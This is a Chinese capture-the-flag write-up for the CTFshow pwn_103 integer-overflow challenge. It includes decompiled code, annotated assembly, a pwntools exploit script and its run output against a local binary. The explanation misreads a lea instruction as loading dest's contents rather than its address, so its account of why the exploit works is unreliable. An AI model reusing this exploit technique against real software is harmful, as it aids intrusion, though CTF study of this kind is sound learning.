# CTFshow-pwn_103
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 整数溢出
## 解题思路
> ~~没搞明白~~memset函数及内存表示

保护全开
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_103
[*] '/home/mrw/CTFshow/pwn_103'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
程序在主函数中调用的漏洞函数 `ctfshow()` 伪代码如下  
```c
unsigned __int64 ctfshow()
{
  int v1; // [rsp+4h] [rbp-6Ch] BYREF
  void *src; // [rsp+8h] [rbp-68h]
  char dest[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+68h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v1 = 0;
  src = 0LL;
  printf("Enter the length of data (up to 80): ");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 80 )
  {
    printf("Enter the data: ");
    __isoc99_scanf(" %[^\n]", dest); // scan-set 读取一整行数据
    memcpy(dest, src, v1);
    if ( (unsigned __int64)dest > 0x1BF52 )
      gift(); // 读取根目录下的 ctfshow_flag 中的 flag
  }
  else
  {
    puts("Invalid input! No cookie for you!");
  }
  return __readfsqword(0x28u) ^ v4;
}
```
核心比较部分的汇编代码如下
```assembly
.text:0000000000000ACF loc_ACF:                                ; CODE XREF: ctfshow+55↑j
.text:0000000000000ACF                 lea     rdi, aEnterTheData ; "Enter the data: "
.text:0000000000000AD6                 mov     eax, 0
.text:0000000000000ADB                 call    _printf
.text:0000000000000AE0                 lea     rax, [rbp+dest] ;
.text:0000000000000AE4                 mov     rsi, rax
.text:0000000000000AE7                 lea     rdi, asc_1523   ; " %[^\n]"
.text:0000000000000AEE                 mov     eax, 0
.text:0000000000000AF3                 call    ___isoc99_scanf
.text:0000000000000AF8                 mov     eax, [rbp+var_6C]
.text:0000000000000AFB                 movsxd  rdx, eax        ; n
.text:0000000000000AFE                 mov     rcx, [rbp+src]
.text:0000000000000B02                 lea     rax, [rbp+dest]
.text:0000000000000B06                 mov     rsi, rcx        ; src
.text:0000000000000B09                 mov     rdi, rax        ; dest
.text:0000000000000B0C                 call    _memcpy
.text:0000000000000B11                 lea     rax, [rbp+dest] ; 直接将 dest 处的8字节数据移入 rax 寄存器
.text:0000000000000B15                 cmp     rax, 1BF52h     ; 将 rax 同 0x1bf52 进行比较并设置相关符号位
.text:0000000000000B1B                 jbe     short loc_B27   ; 根据符号位进行跳转
                                                               ; 上两条指令相当于“对 rax 与 0x1bf52 ，若两者作为无符号整数有 rax < 0x1bf52”
.text:0000000000000B1D                 mov     eax, 0
.text:0000000000000B22                 call    gift
```

只要 dest 数组的前8字节 组成的无符号长整数大于 0x1bf52 即可获取 flag  
可以发现，memcpy 的复制长度我们可以直接设成0，随后随便输入一个大于 0x1bf52 的无符号长整数即可（如`b'\xff\xff\xff'`） 
**exp 如下**  
```python
from pwn import *
p = process('./pwn_103')
p.sendline(str(0).encode())
p.sendline(b'\xff\xff\xff')
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_103.py 
[+] Starting local process './pwn_103': pid 8510
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Integer_Overflow                                        
    * Site  : https://ctf.show/                                       
    * Hint  : Learn something first !                                 
    * *************************************                           
Maybe these help you:
 ====================================================================================================
           Type         |      Byte      |                          Range                            
 ====================================================================================================
      short int         |     2 byte     |                  0~0x7fff 0x8000~0xffff                   
   unsigned short int   |     2 byte     |                        0~0xffff                           
          int           |     4 byte     |             0~0x7fffffff 0x80000000~0xffffffff            
    unsigned int        |     4 byte     |                        0~0xffffffff                       
      long int          |     8 byte     | 0~0x7fffffffffffffff 0x8000000000000000~0xffffffffffffffff
   unsigned long int    |     8 byte     |                    0~0xffffffffffffffff                   
 ====================================================================================================
Enter the length of data (up to 80): Enter the data: This is the third question of this type
Here is you want:
flag{Success!}
[*] Got EOF while reading in interactive
```
